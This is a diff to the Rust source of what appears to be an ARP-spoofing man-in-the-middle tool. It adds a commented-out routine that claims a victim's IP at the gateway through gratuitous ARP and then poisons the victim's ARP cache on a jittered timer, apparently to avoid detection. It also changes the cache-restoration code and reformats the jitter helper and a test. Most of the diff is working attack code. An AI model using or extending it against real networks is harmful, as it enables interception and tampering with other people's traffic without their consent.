@@ -32,7 +32,7 @@
 //
 // ─────────────────────────────────────────────────────────────────────────────
 
-use crate::network::packet::{ArpPoison, ArpRestore};
+use crate::network::packet::{ArpPoison, ArpRestore, GratuitousArp};
 use pnet::datalink::DataLinkSender;
 use pnet::util::MacAddr;
 use std::sync::Arc;
@@ -168,49 +168,153 @@ impl PoisonLoop {
         }
     }
 
+    // src/spoofer/poison.rs - replace run():
+
+    // pub async fn run(
+    //     &self,
+    //     target: super::SpoofTarget,
+    //     mut stop_rx: tokio::sync::oneshot::Receiver<()>,
+    // ) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
+    //     println!(
+    //         "[*] Establishing MITM for {} via gratuitous ARP",
+    //         target.victim_ip
+    //     );
+
+    //     // ── Phase 1: One-time gratuitous ARP to claim the victim's IP ────────
+    //     let garp = GratuitousArp::new(target.victim_ip, self.our_mac);
+    //     {
+    //         let mut sender = self.sender.lock().await;
+    //         // Send 3 times for reliability (ARP can drop)
+    //         for _ in 0..3 {
+    //             if let Some(Err(e)) = sender.send_to(&garp.to_bytes(), None) {
+    //                 eprintln!("[!] gratuitous ARP failed: {e}");
+    //             }
+    //             drop(sender);
+    //             tokio::time::sleep(Duration::from_millis(100)).await;
+    //             sender = self.sender.lock().await;
+    //         }
+    //     }
+
+    //     println!("[+] Gateway now routes {} → our MAC", target.victim_ip);
+
+    //     // ── Phase 2: Periodic victim-only poisoning ──────────────────────────
+    //     let to_victim = ArpPoison::new(
+    //         target.victim_mac,
+    //         target.victim_ip,
+    //         target.gateway_ip,
+    //         self.our_mac,
+    //     );
+
+    //     let mut next_victim = tokio::time::Instant::now() + jitter(VICTIM_INTERVAL_MS);
+    //     let mut victim_count = 0u64;
+
+    //     loop {
+    //         tokio::select! {
+    //             _ = tokio::time::sleep_until(next_victim) => {
+    //                 let v = to_victim.to_bytes();
+    //                 let mut sender = self.sender.lock().await;
+    //                 if let Some(Err(e)) = sender.send_to(&v, None) {
+    //                     eprintln!("[!] poison victim {}: {e}", target.victim_ip);
+    //                 }
+    //                 victim_count += 1;
+    //                 next_victim = tokio::time::Instant::now() + jitter(VICTIM_INTERVAL_MS);
+
+    //                 if victim_count % 10 == 0 {
+    //                     println!(
+    //                         "[*] victim refresh #{} for {} (gateway untouched)",
+    //                         victim_count, target.victim_ip
+    //                     );
+    //                 }
+    //             }
+    //             _ = &mut stop_rx => {
+    //                 println!("[*] stopping MITM for {}", target.victim_ip);
+    //                 self.restore(&target).await?;
+    //                 return Ok(());
+    //             }
+    //         }
+    //     }
+    // }
+
     async fn restore(
         &self,
         target: &super::SpoofTarget,
     ) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
-        println!("[*] restoring ARP caches for host {}", target.host_id);
+        println!("[*] restoring ARP caches for {}", target.victim_ip);
 
-        // Victim learns: gateway IP → real gateway MAC (the truth)
+        // Victim restoration (unchanged)
         let victim_restore = ArpRestore::new(
             target.victim_mac,
             target.victim_ip,
             target.gateway_ip,
             target.gateway_mac,
         );
-        // Gateway learns: victim IP → real victim MAC (the truth)
-        let gateway_restore = ArpRestore::new(
-            target.gateway_mac,
-            target.gateway_ip,
+
+        // Gateway restoration: re-announce correct mapping
+        let gateway_restore_garp = GratuitousArp::new(
             target.victim_ip,
-            target.victim_mac,
+            target.victim_mac, // ← Real victim MAC now
         );
 
         let mut sender = self.sender.lock().await;
-
-        // Send 5 restore packets each with a short gap.
-        // Multiple copies reduce the chance of a packet drop leaving the
-        // cache in a corrupted state.
         for _ in 0..5 {
             if let Some(Err(e)) = sender.send_to(&victim_restore.to_bytes(), None) {
                 eprintln!("[!] restore victim: {e}");
             }
-            if let Some(Err(e)) = sender.send_to(&gateway_restore.to_bytes(), None) {
+            if let Some(Err(e)) = sender.send_to(&gateway_restore_garp.to_bytes(), None) {
                 eprintln!("[!] restore gateway: {e}");
             }
-            // Brief pause between bursts — same reasoning as the poison
-            // refresh rate: give the ARP stack time to process each update.
             drop(sender);
             tokio::time::sleep(Duration::from_millis(100)).await;
             sender = self.sender.lock().await;
         }
 
-        println!("[+] ARP caches restored for host {}", target.host_id);
+        println!("[+] ARP caches restored for {}", target.victim_ip);
         Ok(())
     }
+
+    // async fn restore(
+    //     &self,
+    //     target: &super::SpoofTarget,
+    // ) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
+    //     println!("[*] restoring ARP caches for host {}", target.host_id);
+
+    //     // Victim learns: gateway IP → real gateway MAC (the truth)
+    //     let victim_restore = ArpRestore::new(
+    //         target.victim_mac,
+    //         target.victim_ip,
+    //         target.gateway_ip,
+    //         target.gateway_mac,
+    //     );
+    //     // Gateway learns: victim IP → real victim MAC (the truth)
+    //     let gateway_restore = ArpRestore::new(
+    //         target.gateway_mac,
+    //         target.gateway_ip,
+    //         target.victim_ip,
+    //         target.victim_mac,
+    //     );
+
+    //     let mut sender = self.sender.lock().await;
+
+    //     // Send 5 restore packets each with a short gap.
+    //     // Multiple copies reduce the chance of a packet drop leaving the
+    //     // cache in a corrupted state.
+    //     for _ in 0..5 {
+    //         if let Some(Err(e)) = sender.send_to(&victim_restore.to_bytes(), None) {
+    //             eprintln!("[!] restore victim: {e}");
+    //         }
+    //         if let Some(Err(e)) = sender.send_to(&gateway_restore.to_bytes(), None) {
+    //             eprintln!("[!] restore gateway: {e}");
+    //         }
+    //         // Brief pause between bursts — same reasoning as the poison
+    //         // refresh rate: give the ARP stack time to process each update.
+    //         drop(sender);
+    //         tokio::time::sleep(Duration::from_millis(100)).await;
+    //         sender = self.sender.lock().await;
+    //     }
+
+    //     println!("[+] ARP caches restored for host {}", target.host_id);
+    //     Ok(())
+    // }
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
@@ -226,10 +330,13 @@ fn jitter(base_ms: u64) -> Duration {
         .duration_since(std::time::UNIX_EPOCH)
         .unwrap_or_default()
         .subsec_nanos() as u64;
-    let rand = (seed.wrapping_mul(6_364_136_223_846_793_005).wrapping_add(1_442_695_040_888_963_407)) >> 33;
+    let rand = (seed
+        .wrapping_mul(6_364_136_223_846_793_005)
+        .wrapping_add(1_442_695_040_888_963_407))
+        >> 33;
 
     let window = (base_ms as f64 * JITTER_FRACTION) as u64; // e.g. 1_600 for 8_000
-    let offset = rand % (window * 2);                        // 0 .. 2*window
+    let offset = rand % (window * 2); // 0 .. 2*window
     // Shift so range is -window .. +window, then clamp to avoid underflow
     let actual = base_ms.saturating_add(offset).saturating_sub(window);
     Duration::from_millis(actual)
@@ -255,7 +362,10 @@ mod tests {
         // With 1000 samples the probability of all being identical is ~0.
         let samples: Vec<u64> = (0..20).map(|_| jitter(8_000).as_millis() as u64).collect();
         let unique: std::collections::HashSet<u64> = samples.iter().copied().collect();
-        assert!(unique.len() > 1, "jitter produced identical values — LCG broken");
+        assert!(
+            unique.len() > 1,
+            "jitter produced identical values — LCG broken"
+        );
     }
 
     #[test]
